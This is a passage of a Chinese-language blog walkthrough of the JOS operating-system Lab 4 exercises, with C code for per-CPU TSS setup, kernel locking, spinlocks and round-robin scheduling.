class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Initialize and load the per-CPU TSS and IDT</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">trap_init_percpu</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// The example code here sets up the Task State Segment (TSS) and</span><br><span class="hljs-comment">// the TSS descriptor for CPU 0. But it is incorrect if we are</span><br><span class="hljs-comment">// running on other CPUs because each CPU has its own kernel stack.</span><br><span class="hljs-comment">// Fix the code so that it works for all CPUs.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hints:</span><br><span class="hljs-comment">//   - The macro &quot;thiscpu&quot; always refers to the current CPU&#x27;s</span><br><span class="hljs-comment">//     struct CpuInfo;</span><br><span class="hljs-comment">//   - The ID of the current CPU is given by cpunum() or</span><br><span class="hljs-comment">//     thiscpu-&gt;cpu_id;</span><br><span class="hljs-comment">//   - Use &quot;thiscpu-&gt;cpu_ts&quot; as the TSS for the current CPU,</span><br><span class="hljs-comment">//     rather than the global &quot;ts&quot; variable;</span><br><span class="hljs-comment">//   - Use gdt[(GD_TSS0 &gt;&gt; 3) + i] for CPU i&#x27;s TSS descriptor;</span><br><span class="hljs-comment">//   - You mapped the per-CPU kernel stacks in mem_init_mp()</span><br><span class="hljs-comment">//   - Initialize cpu_ts.ts_iomb to prevent unauthorized environments</span><br><span class="hljs-comment">//     from doing IO (0 is not the correct value!)</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// ltr sets a &#x27;busy&#x27; flag in the TSS selector, so if you</span><br><span class="hljs-comment">// accidentally load the same TSS on more than one CPU, you&#x27;ll</span><br><span class="hljs-comment">// get a triple fault.  If you set up an individual CPU&#x27;s TSS</span><br><span class="hljs-comment">// wrong, you may not get a fault until you try to return from</span><br><span class="hljs-comment">// user space on that CPU.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// LAB 4: Your code here:</span><br><br><span class="hljs-comment">// Setup a TSS so that we get the right stack</span><br><span class="hljs-comment">// when we trap to the kernel.</span><br>thiscpu-&gt;cpu_ts.ts_esp0 = KSTACKTOP - (KSTKSIZE + KSTKGAP) * cpunum();<br>thiscpu-&gt;cpu_ts.ts_ss0 = GD_KD;<br>thiscpu-&gt;cpu_ts.ts_iomb = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Taskstate);<br><br><span class="hljs-comment">// Initialize the TSS slot of the gdt.</span><br>gdt[(GD_TSS0 &gt;&gt; <span class="hljs-number">3</span>) + cpunum()] = SEG16(STS_T32A, (<span class="hljs-type">uint32_t</span>) (&amp;thiscpu-&gt;cpu_ts),<br><span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Taskstate) - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>gdt[(GD_TSS0 &gt;&gt; <span class="hljs-number">3</span>) + cpunum()].sd_s = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// Load the TSS selector (like other segment selectors, the</span><br><span class="hljs-comment">// bottom three bits are special; we leave them 0)</span><br>ltr(GD_TSS0 + (cpunum() * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Segdesc)));<br><br><span class="hljs-comment">// Load the IDT</span><br>lidt(&amp;idt_pd);<br>&#125;<br></code></pre></td></tr></table></figure><p>运行 <code>make qemu CPUS=4</code>，可以看到我们的几个处理器都成功地启动了：</p><p><img src="https://s2.loli.net/2022/03/21/VvEiuky4DseIRTq.png" alt="image.png"></p><h4 id="Locking">Locking</h4><p>伴随着多处理器系统的出现， <em>条件竞争</em> （race condition）成为了我们不得不考虑的一个问题，因此我们需要使用 <code>锁</code> 来保护临界区中的数据，在同一时间段只有一个 CPU 可以改变临界区内的数据，比较朴素的一个办法就是使用一个全局的 <em>big kernel lock</em> ，当用户进程进入内核态时上锁，退出后再解锁，这样在同一时刻只有一个用户进程可以运行在内核态，确保了内核数据的安全</p><p>在 <code>kern/spinlock.h</code> 中定义了一个大的内核锁 <code>kernel_lock</code>，同时提供了加锁与解锁的函数 <code>lock_kernel()</code> 和 <code>unlock_kernel()</code>，我们应当在以下四个地方使用大内核锁：</p><ul><li>在 BSP 唤醒 APs 前请求锁（<code>i386_init()</code>）</li><li>在初始化当前 AP 后请求锁（<code>mp_main()</code>），之后调用 <code>sched_yield()</code> 以在该 AP 上运行用户进程</li><li>在从用户态陷入内核态时请求锁（<code>trap()</code>），为了确定陷阱发生在用户态还是内核态，我们应当检查 <code>tf_cs</code> 的 RPL</li><li>在从内核态切换到用户态之前释放锁（<code>env_run()</code>），不要过早或过晚，否则可能会造成竞态或死锁</li></ul><p>于是接下来就是 Exercise 5：在上述位置补充相应的锁</p><blockquote><p><strong>Exercise 5.</strong> Apply the big kernel lock as described above, by calling <code>lock_kernel()</code> and <code>unlock_kernel()</code> at the proper locations.</p></blockquote><p>在 JOS 中，一个自旋锁起其实被定义为一个普通的整型变量，<strong>但是上锁与解锁的操作是通过原子指令完成的</strong>，而原子指令的实现<strong>其实是通过 <code>lock</code> 前缀完成的</strong>，被该前缀修饰的指令在访问内存时同时会完成对总线的控制，直到指令结束，从而<strong>从硬件层面保证了指令的原子性</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">uint32_t</span><br><span class="hljs-title function_">xchg</span><span class="hljs-params">(<span class="hljs-keyword">volatile</span> <span class="hljs-type">uint32_t</span> *addr, <span class="hljs-type">uint32_t</span> newval)</span><br>&#123;<br><span class="hljs-type">uint32_t</span> result;<br><br><span class="hljs-comment">// The + in &quot;+m&quot; denotes a read-modify-write operand.</span><br><span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;lock; xchgl %0, %1&quot;</span></span><br><span class="hljs-params">     : <span class="hljs-string">&quot;+m&quot;</span> (*addr), <span class="hljs-string">&quot;=a&quot;</span> (result)</span><br><span class="hljs-params">     : <span class="hljs-string">&quot;1&quot;</span> (newval)</span><br><span class="hljs-params">     : <span class="hljs-string">&quot;cc&quot;</span>)</span>;<br><span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>现在你知道一个自旋锁该怎么实现了吧 ；）那么互斥锁呢？互斥锁的实现其实需要依赖额外的辅助结构…</p></blockquote><p>这里 <code>lock_kernel()</code> 和 <code>unlock_kernel()</code>直接操作的就是大内核锁，所以我们直接将其放置在对应位置即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">i386_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// ...</span><br><br><span class="hljs-comment">// Acquire the big kernel lock before waking up APs</span><br><span class="hljs-comment">// Your code here:</span><br>lock_kernel();<br>    <br>    <span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Setup code for APs</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">mp_main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// We are in high EIP now, safe to switch to kern_pgdir </span><br>lcr3(PADDR(kern_pgdir));<br>cprintf(<span class="hljs-string">&quot;SMP: CPU %d starting\n&quot;</span>, cpunum());<br><br>lapic_init();<br>env_init_percpu();<br>trap_init_percpu();<br>xchg(&amp;thiscpu-&gt;cpu_status, CPU_STARTED); <span class="hljs-comment">// tell boot_aps() we&#x27;re up</span><br><br><span class="hljs-comment">// Now that we have finished some basic setup, call sched_yield()</span><br><span class="hljs-comment">// to start running processes on this CPU.  But make sure that</span><br><span class="hljs-comment">// only one CPU can enter the scheduler at a time!</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Your code here:</span><br>lock_kernel();<br>    sched_yield();<br><br><span class="hljs-comment">// Remove this after you finish Exercise 6</span><br><span class="hljs-keyword">for</span> (;;);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">trap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br><span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">if</span> ((tf-&gt;tf_cs &amp; <span class="hljs-number">3</span>) == <span class="hljs-number">3</span>) &#123;<br><span class="hljs-comment">// Trapped from user mode.</span><br><span class="hljs-comment">// Acquire the big kernel lock before doing any</span><br><span class="hljs-comment">// serious kernel work.</span><br><span class="hljs-comment">// LAB 4: Your code here.</span><br>assert(curenv);<br>lock_kernel();<br><br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">env_run</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *e)</span><br>&#123;<br><span class="hljs-comment">// ...</span><br><br><span class="hljs-comment">// recover the context of process and ret2usr</span><br>    unlock_kernel();<br>lcr3(PADDR(curenv-&gt;env_pgdir));<br>env_pop_tf(&amp;curenv-&gt;env_tf);<br><br><span class="hljs-comment">// we never arrive there</span><br>panic(<span class="hljs-string">&quot;env_run not yet implemented&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>下面是习题 time：为什么有了大内核锁我们还要为每个 CPU 分配一个独立的内核栈？</p><blockquote><p><strong>Question</strong></p><ol><li>It seems that using the big kernel lock guarantees that only one CPU can run the kernel code at a time. Why do we still need separate kernel stacks for each CPU? Describe a scenario in which using a shared kernel stack will go wrong, even with the protection of the big kernel lock.</li></ol></blockquote><p>我们在从用户态陷入到内核态再到获取到锁中间仍有一段需要压栈的过程，因此若多个用户进程同时陷入内核态则会破坏掉内核栈上保存的属于其他用户进程的栈帧</p><p>之后是 Challenge，为四个地方加上锁：</p><blockquote><p><em>Challenge!</em> The big kernel lock is simple and easy to use. Nevertheless, it eliminates all concurrency in kernel mode. Most modern operating systems use different locks to protect different parts of their shared state, an approach called <em>fine-grained locking</em>. Fine-grained locking can increase performance significantly, but is more difficult to implement and error-prone. If you are brave enough, drop the big kernel lock and embrace concurrency in JOS!</p><p>It is up to you to decide the locking granularity (the amount of data that a lock protects). As a hint, you may consider using spin locks to ensure exclusive access to these shared components in the JOS kernel:</p><ul><li>The page allocator.</li><li>The console driver.</li><li>The scheduler.</li><li>The inter-process communication (IPC) state that you will implement in the part C.</li></ul></blockquote><p>第四个在 part C 才实现，我们先看前三个</p><p>首先是 page allocator，我们在这里声明一个全局的锁变量，在 <code>page_init()</code> 中对其初始化，并在 <code>page_alloc()</code> 与 <code>page_free()</code> 中都加入对该锁的使用，这里笔者选择为这两个函数再添加一层 wrapper 来使用锁</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// spinlock for page allocator</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">page_lock</span>;</span><br><br><span class="hljs-comment">// ...</span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">page_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">// ...</span><br>    <br><span class="hljs-comment">// 6) init page_lock</span><br>__spin_initlock(&amp;page_lock, <span class="hljs-string">&quot;page allocator lock&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *</span><br><span class="hljs-class">__<span class="hljs-title">page_alloc</span>(<span class="hljs-title">int</span> <span class="hljs-title">alloc_flags</span>)</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">struct</span> PageInfo *<br><span class="hljs-title function_">page_alloc</span><span class="hljs-params">(<span class="hljs-type">int</span> alloc_flags)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">res</span>;</span><br><br>spin_lock(&amp;page_lock);<br>res = __page_alloc(alloc_flags);<br>spin_unlock(&amp;page_lock);<br><br><span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-comment">// ...</span><br><br><span class="hljs-type">void</span><br>__page_free(<span class="hljs-keyword">struct</span> PageInfo *pp)<br>&#123;<br>    <span class="hljs-comment">//...</span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">page_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> PageInfo *pp)</span><br>&#123;<br>spin_lock(&amp;page_lock);<br>res = __page_free(pp);<br>spin_unlock(&amp;page_lock);<br>&#125;<br></code></pre></td></tr></table></figure><p>console driver 其实也是同样的思路，不过笔者分为读和写两个锁：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">read_lock</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">write_lock</span>;</span><br><br><span class="hljs-comment">// ...</span><br><br><span class="hljs-comment">// initialize the console devices</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">cons_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>cga_init();<br>kbd_init();<br>serial_init();<br><br>__spin_initlock(&amp;read_lock, <span class="hljs-string">&quot;console read lock&quot;</span>);<br>__spin_initlock(&amp;write_lock, <span class="hljs-string">&quot;console write lock&quot;</span>);<br><br><span class="hljs-keyword">if</span> (!serial_exists)<br>cprintf(<span class="hljs-string">&quot;Serial port does not exist!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// `High&#x27;-level console I/O.  Used by readline and cprintf.</span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">cputchar</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>spin_lock(&amp;write_lock);<br>cons_putc(c);<br>spin_unlock(&amp;write_lock);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">getchar</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">int</span> c;<br><br>spin_lock(&amp;read_lock);<br><br><span class="hljs-keyword">while</span> ((c = cons_getc()) == <span class="hljs-number">0</span>)<br><span class="hljs-comment">/* do nothing */</span>;<br><br>spin_unlock(&amp;read_lock);<br><br><span class="hljs-keyword">return</span> c;<br>&#125;<br></code></pre></td></tr></table></figure><p><s>scheduler 现在还没有写呢，所以👴选择摸了</s></p><h3 id="Round-Robin-Scheduling">Round-Robin Scheduling</h3><blockquote><p>关于这个算法，笔者在<a href="https://arttnba3.cn/2021/09/07/PIECES-0X01-SHELL_OUTSIDE-1-WINDY_SUMMER/#%E5%85%B3%E4%BA%8E%E8%BD%AE%E8%AF%A2%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E4%BA%8C%E4%B8%89%E4%BA%8B">这篇博客</a>里写了他的来龙去脉</p></blockquote><p>接下来我们需要实现 <em>轮询调度算法</em> ：</p><ul><li><code>sched_yield()</code> 用以从遍历 <code>envs[]</code> 数组并选择第一个状态为 <code>ENV_RUNNABLE</code> 的进程去运行</li><li><code>sched_yield()</code> 不应当让一个进程被同时跑在两个 CPU 上</li><li>JOS 还实现了一个新的系统调用 <code>sys_yield()</code> 以让当前用户进程休眠，使当前 CPU 去运行另一个进程</li></ul><p>接下来是 Exercise 6 了，在 <code>sched_yield()</code>  中实现轮询调度算法：</p><blockquote><p><strong>Exercise 6.</strong> Implement round-robin scheduling in <code>sched_yield()</code> as described above. Don’t forget to modify <code>syscall()</code> to dispatch <code>sys_yield()</code>.</p><p>Make sure to invoke <code>sched_yield()</code> in <code>mp_main</code>.</p><p>Modify <code>kern/init.c</code> to create three (or more!) environments that all run the program <code>user/yield.c</code>.</p><p>Run make qemu. You should see the environments switch back and forth between each other five times before terminating, like below.</p><p>Test also with several CPUS: make qemu CPUS=2.</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs erlang">...<br>Hello, I am environment <span class="hljs-number">00001000</span>.<br>Hello, I am environment <span class="hljs-number">00001001</span>.<br>Hello, I am environment <span class="hljs-number">00001002</span>.<br>Back in environment <span class="hljs-number">00001000</span>, iteration <span class="hljs-number">0</span>.<br>Back in environment <span class="hljs-number">00001001</span>, iteration <span class="hljs-number">0</span>.<br>Back in environment <span class="hljs-number">00001002</span>, iteration <span class="hljs-number">0</span>.<br>Back in environment <span class="hljs-number">00001000</span>, iteration <span class="hljs-number">1</span>.<br>Back in environment <span class="hljs-number">00001001</span>, iteration <span class="hljs-number">1</span>.<br>Back in environment <span class="hljs-number">00001002</span>, iteration <span class="hljs-number">1</span>.<br>...<br></code></pre></td></tr></table></figure><p>After the <code>yield</code> programs exit, there will be no runnable environment in the system, the scheduler should invoke the JOS kernel monitor. If any of this does not happen, then fix your code before proceeding.</p></blockquote><p>前面的 Challenge 说到为 scheduler 加锁，因此笔者选择在 <code>kern/env.h</code> 中声明一个自旋锁，定义放在 <code>kern/env.c</code> 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">sched_lock</span>;</span><span class="hljs-comment">// lock for Env in scheduler</span><br></code></pre></td></tr></table></figure><p>在 <code>env_init()</code> 中对其初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">env_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br><span class="hljs-comment">// initialize the scheduler lock</span><br>__spin_initlock(&amp;sched_lock, <span class="hljs-string">&quot;scheduler lock&quot;</span>);<br></code></pre></td></tr></table></figure><p>最后就是实现 <code>sched_yield()</code> 了，这里为了保证公平因此我们应当从当前进程往后进行遍历而不是每次都从 env[0] 开始，需要注意的是若我们轮询一遍进程数组发现没有其他可运行进程的话需要返回到发起 yield 的进程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Choose a user environment to run and run it.</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">sched_yield</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">idle</span>;</span><br><br><span class="hljs-comment">// Implement simple round-robin scheduling.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Search through &#x27;envs&#x27; for an ENV_RUNNABLE environment in</span><br><span class="hljs-comment">// circular fashion starting just after the env this CPU was</span><br><span class="hljs-comment">// last running.  Switch to the first such environment found.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// If no envs are runnable, but the environment previously</span><br><span class="hljs-comment">// running on this CPU is still ENV_RUNNING, it&#x27;s okay to</span><br><span class="hljs-comment">// choose that environment.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Never choose an environment that&#x27;s currently running on</span><br><span class="hljs-comment">// another CPU (env_status == ENV_RUNNING). If there are</span><br><span class="hljs-comment">// no runnable environments, simply drop through to the code</span><br><span class="hljs-comment">// below to halt the cpu.</span><br><br><span class="hljs-comment">// LAB 4: Your code here.</span><br><span class="hljs-type">int</span> i, start_idx;<br><br>spin_lock(&amp;sched_lock);<br><br>idle = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">if</span> (curenv)<br>start_idx = ENVX(curenv-&gt;env_id) + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span><br>start_idx = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// traversal envs</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NENV; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (envs[(start_idx + i) % NENV].env_status == ENV_RUNNABLE)<br>&#123;<br>idle = &amp;envs[(start_idx + i) % NENV];<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// no other runnable, try to rerun curenv</span><br><span class="hljs-keyword">if</span> (!idle &amp;&amp; curenv <br>&amp;&amp; curenv-&gt;env_status == ENV_RUNNING<br>&amp;&amp; curenv-&gt;env_cpunum == cpunum())<br>idle = curenv;<br><br><span class="hljs-keyword">if</span> (idle)<br>&#123;<br>idle-&gt;env_status = ENV_RUNNING;<br>spin_unlock(&amp;sched_lock);<br>env_run(idle);<br>&#125;<br><br>spin_unlock(&amp;sched_lock);<br><span class="hljs-comment">// sched_halt never returns</span><br>sched_halt();<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们的自旋锁还需要保护整个 env 数组，在 <code>env_alloc()</code> 与 <code>env_free()</code> 上套一层 wrapper：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <br><span class="hljs-title function_">env_alloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env **newenv_store, <span class="hljs-type">envid_t</span> parent_id)</span><br>&#123;<br><span class="hljs-type">int</span> res;<br><br>spin_lock(&amp;sched_lock);<br>res = __env_alloc(newenv_store, parent_id);<br>spin_unlock(&amp;sched_lock);<br><br><span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">env_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Env *e)</span><br>&#123;<br>spin_lock(&amp;sched_lock);<br>__env_free(e);<br>spin_unlock(&amp;sched_lock);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这里笔者为了完成加锁的那个 Challenge，走了不少弯路…也掉了几次坑…</p></blockquote><p>别忘了在 <code>kern/syscall.c</code> 中补充上对 <code>sys_yield()</code> 的调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 